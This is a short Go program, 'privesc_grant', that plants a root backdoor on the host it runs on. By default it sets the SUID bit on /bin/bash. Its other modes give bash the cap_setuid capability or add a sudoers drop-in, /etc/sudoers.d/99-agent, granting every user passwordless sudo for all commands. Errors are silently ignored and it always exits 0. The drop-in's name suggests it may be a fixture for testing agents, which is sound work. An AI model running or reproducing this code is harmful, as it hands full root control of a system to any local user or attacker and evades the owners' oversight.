// privesc_grant — grant a privilege-escalation primitive on a target.
//
// Env vars:
//   TARGET         binary path the primitive is applied to.
//   MODE           one of: suid | setcap | sudoers.
//   CAP            capability expression (setcap mode).
//   SUDOERS_LINE   sudoers drop-in line (sudoers mode).
//   SUDOERS_FILE   sudoers drop-in path (sudoers mode; default
//                  /etc/sudoers.d/99-agent).
//
// "suid": chmod 4755 TARGET. "setcap": exec `setcap CAP TARGET`.
// "sudoers": append SUDOERS_LINE to SUDOERS_FILE (0o440).
// Unknown MODE or any error → exit 0.
package main

import (
	"os"
	"os/exec"
)

func envOr(key, def string) string {
	if v, ok := os.LookupEnv(key); ok && v != "" {
		return v
	}
	return def
}

func run() int {
	target := envOr("TARGET", "/bin/bash")
	mode := envOr("MODE", "suid")
	cap_ := envOr("CAP", "cap_setuid+ep")
	sudoersLine := envOr("SUDOERS_LINE", "ALL ALL=(ALL) NOPASSWD: ALL")
	sudoersFile := envOr("SUDOERS_FILE", "/etc/sudoers.d/99-agent")

	switch mode {
	case "suid":
		_ = os.Chmod(target, 0o4755)
	case "setcap":
		setcap, err := exec.LookPath("setcap")
		if err != nil {
			return 0
		}
		_ = exec.Command(setcap, cap_, target).Run()
	case "sudoers":
		fh, err := os.OpenFile(sudoersFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o440)
		if err != nil {
			return 0
		}
		defer fh.Close()
		_, _ = fh.WriteString(sudoersLine + "\n")
		_ = os.Chmod(sudoersFile, 0o440)
	}
	return 0
}

func main() { os.Exit(run()) }
